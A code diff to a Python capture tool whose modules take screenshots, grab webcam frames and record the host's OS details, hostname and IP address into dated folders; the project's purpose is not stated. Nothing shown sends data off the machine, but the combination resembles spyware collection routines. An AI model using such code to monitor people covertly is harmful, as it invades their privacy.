@@ -2,10 +2,8 @@ import abc
 import pyautogui
 import cv2
 import platform
-import datetime
-from pydub import AudioSegment
-from pydub.playback import play
-from playsound import playsound
+import socket
+import json
 
 from captures import cpath
 
@@ -21,7 +19,7 @@ class Screenshot(Module):
 
     def run(self, save_path_name):
         screenshot = pyautogui.screenshot()
-        screenshot.save(cpath.route + 'screenshot-' + save_path_name + '.jpg')
+        screenshot.save(cpath.generate_day_folder() + '/screenshot-' + save_path_name + '.jpg')
 
 
 class WebcamSnap(Module):
@@ -33,7 +31,7 @@ class WebcamSnap(Module):
         else:
             webcam = cv2.VideoCapture(cam_id)
             check, frame = webcam.read()
-            cv2.imwrite(cpath.route + 'webcam_snap-' + save_path_name + '.jpg', img=frame)
+            cv2.imwrite(cpath.generate_day_folder() + '/webcam_snap-' + save_path_name + '.jpg', img=frame)
             webcam.release()
 
     def search_camera_id(self):
@@ -51,8 +49,25 @@ class SystemInfo(Module):
 
     def run(self, save_path_name):
         uname = platform.uname()
+        hostname = socket.gethostname()
+
         data = {
+            'System': uname.system,
+            'Node name': uname.node,
+            'Version': uname.version,
+            'Machine': uname.machine,
+            'Hostname': hostname,
+            'Ip Address': socket.gethostbyname(hostname)
         }
+        path = cpath.generate_day_folder() + '/system_info-' + save_path_name + '.json'
+        with open(path, 'w') as file:
+            json.dump(data, file, indent=4)
 
 
+if __name__ == '__main__':
+    screenshot = Screenshot()
+    systeminfo = SystemInfo()
+
+    screenshot.run('sc')
+    systeminfo.run('sy')
 
